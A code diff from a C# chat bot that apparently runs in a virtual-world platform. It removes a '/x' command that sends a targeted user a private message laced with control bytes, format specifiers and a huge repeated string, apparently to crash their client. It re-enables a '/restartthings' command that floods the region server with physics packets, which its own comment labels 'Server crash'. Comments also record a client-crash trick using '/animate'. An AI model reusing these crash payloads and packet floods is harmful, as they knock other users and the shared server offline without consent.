@@ -551,20 +551,6 @@ Height: {promptResult.ResultInfo.height}
                 return;
             }
 
-            if (e.Message.StartsWith("/x "))
-            {
-                var args = e.Message.Split(" ");
-                if (args.Length > 1)
-                {
-                    var target = args[1].ToLower().Trim();
-                    var targetPersona = Driver.PersonasBySessionId.Where(n => n.Value.Handle.ToLower() == target).Select(n => n.Value).FirstOrDefault();
-                    if (targetPersona != null)
-                    {
-                        Driver.SendPrivateMessage(targetPersona.PersonaId, "a\x0f\x10\x11%n%p%cBeep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boopBeep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop Beep boop");
-                    }
-                }
-            }
-
             // Client crash (all):
             // /animate f8d1b2b4-41f4-3e02-5a9b-c2f8b299549b 0 1 0  (mode = 0, speed =1, type = 0) (or was this 2?)
             if (e.Message.StartsWith("/animate "))
@@ -702,17 +688,17 @@ Height: {promptResult.ResultInfo.height}
                     Driver.SendChatMessage(result);
                 }
             }
-            //if (e.Message == "/restartthings")
-            //{
-            //    var testMessage = new SanProtocol.ClientRegion.ClientRuntimeInventoryUpdatedNotification("Butts");
-            //    Driver.RegionClient.SendPacket(testMessage);
-            //
-            //    //Server crash (from spam?)
-            //     for (int i = 0; i < 255; i++)
-            //     {
-            //         Driver.RegionClient.SendPacket(new SanProtocol.AgentController.SetCharacterNodePhysics(Driver.GetCurrentFrame(), (uint)i, (byte)i, 1, 1));
-            //     }
-            //}
+            if (e.Message == "/restartthings")
+            {
+                var testMessage = new SanProtocol.ClientRegion.ClientRuntimeInventoryUpdatedNotification("Butts");
+                Driver.RegionClient.SendPacket(testMessage);
+            
+                //Server crash (from spam?)
+                 for (int i = 0; i < 255; i++)
+                 {
+                     Driver.RegionClient.SendPacket(new SanProtocol.AgentController.SetCharacterNodePhysics(Driver.GetCurrentFrame(), (uint)i, (byte)i, 1, 1));
+                 }
+            }
             if (e.Message == "/jump")
             {
                 foreach (var item in Driver.PersonasBySessionId)
